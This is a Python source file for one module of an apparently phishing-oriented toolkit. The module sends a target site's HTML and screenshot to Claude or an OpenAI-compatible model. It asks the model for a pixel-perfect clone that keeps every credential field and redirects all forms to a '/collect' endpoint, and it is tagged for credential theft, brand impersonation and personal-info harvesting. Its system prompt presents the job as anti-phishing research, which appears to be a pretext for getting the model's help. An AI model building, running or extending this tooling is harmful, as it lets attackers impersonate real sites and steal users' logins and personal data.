from __future__ import annotations

import base64
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)

try:
    import anthropic
    _ANTHROPIC_OK = True
except ImportError:
    _ANTHROPIC_OK = False

try:
    from openai import OpenAI as _OpenAI
    _OPENAI_OK = True
except ImportError:
    _OPENAI_OK = False


def _resolve_credentials(options: dict[str, Any]) -> tuple[str, str, str, str]:
    """Returns (provider, base_url, api_key, model). Per-run options override env.

    Per-run options come from the `_llm_*` keys injected by the engine.
    """
    provider = (options.get("_llm_provider") or "").strip().lower()
    base_url = (options.get("_llm_base_url") or "").strip()
    api_key = (options.get("_llm_api_key") or "").strip()
    model = (options.get("_llm_model") or options.get("model") or "").strip()

    if not api_key:
        try:
            from app.config import get_settings_sync
            api_key = (get_settings_sync().anthropic_api_key or "").strip()
            if api_key and not provider:
                provider = "anthropic"
        except Exception:
            api_key = ""

    if not provider:
        if base_url and "anthropic" not in base_url.lower():
            provider = "openai"
        else:
            provider = "anthropic"

    return provider, base_url, api_key, model


def _default_model(provider: str) -> str:
    return "claude-opus-4-6" if provider == "anthropic" else "gpt-4o-mini"


_MODEL_HTML_BUDGET: dict[str, int] = {
    "claude-haiku": 12000,
    "claude-sonnet": 40000,
    "claude-opus": 60000,
    "gpt-4o-mini": 25000,
    "gpt-4o": 80000,
    "gpt-4-turbo": 60000,
    "gemini-flash": 25000,
    "gemini-pro": 80000,
}


def _budget_for_model(model: str, fallback: int) -> int:
    """Return the HTML-char budget for the given model id."""
    if not model:
        return fallback
    m = model.lower()
    for key, budget in _MODEL_HTML_BUDGET.items():
        if key in m:
            return budget
    return fallback


class AiCloningTechnique(BaseTechnique):
    """
    T23 — AI full-page cloning.

    Refines the target HTML clone (and optional screenshot) using either:
      • Anthropic Claude (default; uses ANTHROPIC_API_KEY or per-run key), or
      • OpenAI-compatible API (OpenAI, Azure OpenAI, OpenRouter, Ollama, vLLM,
        LM Studio, etc.) — pick by passing per-run `_llm_provider="openai"`
        plus `_llm_base_url` and `_llm_api_key`.

    The route layer (POST /generate, /generate-bulk) injects per-run credentials
    so the user supplies them in the UI per run, no env edits needed.
    """

    TECHNIQUE_ID: ClassVar[int] = 23
    TECHNIQUE_NAME: ClassVar[str] = "AI Full-Page Cloning (LLM)"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.ADVANCED_AI
    CATEGORIES: ClassVar[list[Category]] = [
        Category.CREDENTIAL_THEFT,
        Category.BRAND_IMPERSONATION,
        Category.PERSONAL_INFO_HARVESTING,
    ]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_HTML, Requirement.REQUIRES_AI]
    DESCRIPTION: ClassVar[str] = (
        "Uses an LLM (Anthropic Claude or any OpenAI-compatible API — OpenAI, "
        "OpenRouter, Ollama, vLLM, LM Studio, …) to refine the HTML clone: "
        "improves visual fidelity, redirects forms to /collect, fine-tunes "
        "statistical features. API key + base URL come from the UI per run."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="model",
            description="Override the model (else uses provider default)",
            type=str,
            default="",
        ),
        OptionSpec(
            name="refinement_focus",
            description=(
                "What to improve: 'visual_fidelity', 'form_fields', or 'full'"
            ),
            type=str,
            default="full",
        ),
        OptionSpec(
            name="collect_endpoint",
            description="URL where credential forms should POST to",
            type=str,
            default="/collect",
        ),
        OptionSpec(
            name="max_html_chars",
            description="Max characters of HTML to send to API (truncated if larger)",
            type=int,
            default=40000,
            min_value=1000,
            max_value=100000,
        ),
        OptionSpec(
            name="max_output_tokens",
            description="Maximum response tokens",
            type=int,
            default=8192,
            min_value=512,
            max_value=64000,
        ),
        OptionSpec(
            name="api_timeout_s",
            description="Hard timeout in seconds for the LLM API call (0 = no timeout)",
            type=float,
            default=90.0,
            min_value=0.0,
            max_value=600.0,
        ),
    ]

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        provider, base_url, api_key, model = _resolve_credentials(options)
        if not model:
            model = _default_model(provider)

        if not api_key:
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "ai_cloning_skipped",
                    "no LLM API key supplied (set provider/base_url/api_key in the UI, or ANTHROPIC_API_KEY in .env)",
                )],
            )

        focus: str = options.get("refinement_focus", "full")
        collect_ep: str = options.get("collect_endpoint", "/collect")
        user_max_chars: int = int(options.get("max_html_chars", 40000))
        max_chars = _budget_for_model(model, user_max_chars)
        max_tokens: int = int(options.get("max_output_tokens", 8192))
        api_timeout_s: float = float(options.get("api_timeout_s", 90.0))
        sdk_timeout = api_timeout_s if api_timeout_s > 0 else None

        truncated_html = html[:max_chars]
        if len(html) > max_chars:
            truncated_html += "\n<!-- [truncated for API call] -->"

        lang = self._detect_lang(html)
        lang_hint = (
            "Detected target language: Persian (fa). Preserve every Persian / "
            "Arabic-script string and the page's RTL direction verbatim. Do not "
            "translate to English."
            if lang == "fa" else
            f"Detected target language: {lang}. Preserve all source-language "
            "strings verbatim — do not translate or paraphrase."
        )
        system_prompt = (
            "You are an expert web developer specializing in creating pixel-perfect "
            "HTML replicas of websites for security research and anti-phishing training datasets. "
            f"Your task: refine the provided HTML clone (focus: {focus}).\n"
            f"{lang_hint}\n"
            "Rules:\n"
            f"1. All <form> action attributes must point to '{collect_ep}'\n"
            "2. Preserve all visual structure, CSS, and layout exactly\n"
            "3. Preserve every <link rel='stylesheet'> href verbatim — do not edit or omit them\n"
            "4. Never invent CSS variables that were not in the original\n"
            "5. Do not delete <svg> elements\n"
            "6. Remove any external script tags that load third-party analytics\n"
            "7. Ensure all credential input fields are present and functional\n"
            "8. Return ONLY the complete refined HTML, no explanation or markdown"
        )
        user_text = f"Target URL: {url}\n\nHTML to refine:\n{truncated_html}"

        try:
            if provider == "anthropic":
                refined_html = self._call_anthropic(
                    api_key, base_url, model, system_prompt, user_text,
                    screenshot_bytes, max_tokens, sdk_timeout,
                )
            else:
                refined_html = self._call_openai_compatible(
                    api_key, base_url, model, system_prompt, user_text,
                    screenshot_bytes, max_tokens, sdk_timeout,
                )
        except Exception as exc:
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "ai_cloning_failed",
                    f"{provider} API call failed: {type(exc).__name__}: {exc}",
                )],
            )

        if not refined_html or not refined_html.strip():
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "ai_cloning_failed",
                    f"{provider} returned empty content",
                    details={"reason": "empty_response", "provider": provider},
                )],
            )

        html_validates = True
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(refined_html, "lxml")
            if not (soup.find("html") or soup.find("body") or soup.find("head")):
                html_validates = False
        except Exception as e:
            html_validates = False
            self.log("warning", "ai_cloning_parse_failed", error=str(e))

        if not html_validates:
            self.log("warning", "ai_cloning_invalid_html",
                     provider=provider, model=model)
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "ai_cloning_skipped",
                    f"{provider} ({model}) returned content that does not parse as HTML",
                    details={
                        "reason": "html_invalid",
                        "provider": provider, "model": model,
                        "input_chars": len(html),
                        "output_chars": len(refined_html),
                    },
                )],
            )

        self.log("info", "ai_cloning_applied",
                 provider=provider, model=model, focus=focus,
                 input_chars=len(html), output_chars=len(refined_html),
                 budget=max_chars)

        return ApplyResult(
            modified_html=refined_html,
            modified_url=None,
            extra_files={},
            change_log=[self._make_change(
                "ai_cloning_applied",
                f"{provider} ({model}) refined HTML clone with focus='{focus}'; "
                f"form action → '{collect_ep}'",
                before=f"{len(html)} chars original HTML",
                after=f"{len(refined_html)} chars refined HTML",
                details={
                    "provider": provider,
                    "model": model,
                    "focus": focus,
                    "input_chars": len(html),
                    "output_chars": len(refined_html),
                    "model_budget": max_chars,
                    "user_budget": user_max_chars,
                    "html_validates": True,
                    "lang": lang,
                },
            )],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        entry = next((e for e in change_log if e.change_type == "ai_cloning_applied"), None)
        skipped = next((e for e in change_log if e.change_type in ("ai_cloning_skipped", "ai_cloning_failed")), None)
        if entry:
            provider = entry.details.get("provider", "?")
            model = entry.details.get("model", "?")
            out_chars = entry.details.get("output_chars", 0)
            signals.append(f"AI cloning applied by {provider}/{model} ({out_chars} output chars)")
        else:
            if skipped:
                issues.append(f"AI cloning was skipped/failed: {skipped.description[:80]}")
            else:
                issues.append("No ai_cloning_applied entry in change_log")

        if html and len(html) > 200:
            signals.append(f"Modified HTML present ({len(html)} chars)")
        else:
            issues.append("HTML is empty or very short after AI cloning")

        if html:
            import re
            form_actions = re.findall(r'<form[^>]+action="([^"]*)"', html, re.IGNORECASE)
            collect_actions = [a for a in form_actions if "/collect" in a or "collect" in a.lower()]
            if collect_actions:
                signals.append(f"Form action(s) point to /collect: {collect_actions[:2]}")
            elif form_actions:
                issues.append(f"Form action(s) found but not pointing to /collect: {form_actions[:2]}")
            else:
                issues.append("No <form> with action attribute found in HTML")

        if html:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, "lxml")
            has_structure = bool(soup.find("html") or soup.find("body"))
            if has_structure:
                signals.append("HTML has valid page structure (html/body tags)")
            else:
                issues.append("HTML lacks valid page structure")

        passed = entry is not None and html and len(html) > 200
        return EvaluationResult(
            passed=bool(passed),
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"html_chars": len(html) if html else 0, "ai_applied": entry is not None},
        )

    def _call_anthropic(
        self, api_key: str, base_url: str, model: str,
        system_prompt: str, user_text: str,
        screenshot_bytes: bytes | None, max_tokens: int,
        timeout: float | None = None,
    ) -> str:
        if not _ANTHROPIC_OK:
            raise RuntimeError("anthropic SDK not installed (pip install anthropic)")
        kwargs: dict = {"api_key": api_key}
        if base_url:
            kwargs["base_url"] = base_url
        if timeout is not None:
            kwargs["timeout"] = timeout
        client = anthropic.Anthropic(**kwargs)

        user_content: list[dict] = [{"type": "text", "text": user_text}]
        if screenshot_bytes:
            user_content.append({
                "type": "image",
                "source": {
                    "type": "base64",
                    "media_type": "image/png",
                    "data": base64.b64encode(screenshot_bytes).decode(),
                },
            })

        response = client.messages.create(
            model=model,
            max_tokens=max_tokens,
            system=system_prompt,
            messages=[{"role": "user", "content": user_content}],
        )
        if not response.content:
            return ""
        parts: list[str] = []
        for block in response.content:
            text = getattr(block, "text", None)
            if text:
                parts.append(text)
        return "".join(parts)

    def _call_openai_compatible(
        self, api_key: str, base_url: str, model: str,
        system_prompt: str, user_text: str,
        screenshot_bytes: bytes | None, max_tokens: int,
        timeout: float | None = None,
    ) -> str:
        if not _OPENAI_OK:
            raise RuntimeError("openai SDK not installed (pip install openai)")
        kwargs: dict = {"api_key": api_key}
        if base_url:
            kwargs["base_url"] = base_url
        if timeout is not None:
            kwargs["timeout"] = timeout
        client = _OpenAI(**kwargs)

        user_content: list[dict] = [{"type": "text", "text": user_text}]
        if screenshot_bytes:
            b64 = base64.b64encode(screenshot_bytes).decode()
            user_content.append({
                "type": "image_url",
                "image_url": {"url": f"data:image/png;base64,{b64}"},
            })

        response = client.chat.completions.create(
            model=model,
            max_tokens=max_tokens,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_content},
            ],
        )
        if not response.choices:
            return ""
        return response.choices[0].message.content or ""
